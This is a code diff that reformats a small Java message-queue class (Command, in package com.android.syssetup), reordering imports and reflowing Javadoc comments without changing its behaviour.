@@ -9,13 +9,13 @@
 
 package com.android.syssetup;
 
-import java.util.LinkedList;
-import java.util.Queue;
-
 import android.os.Message;
 
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.util.Check;
+
+import java.util.LinkedList;
+import java.util.Queue;
 
 /**
  * The Class Command.
@@ -23,7 +23,9 @@ import com.android.syssetup.util.Check;
 public class Command {
 	private static final String TAG = "Command"; //$NON-NLS-1$
 
-	/** The msg queue. */
+	/**
+	 * The msg queue.
+	 */
 	private final Queue<Message> msgQueue;
 
 	/**
@@ -36,9 +38,8 @@ public class Command {
 
 	/**
 	 * Push message.
-	 * 
-	 * @param msg
-	 *            the msg
+	 *
+	 * @param msg the msg
 	 */
 	public synchronized void pushMessage(final Message msg) {
 		if (msg == null) {
@@ -52,9 +53,10 @@ public class Command {
 	}
 
 	// Returns null if the queue is empty
+
 	/**
 	 * Gets the message.
-	 * 
+	 *
 	 * @return the message
 	 */
 	public synchronized Message getMessage() {
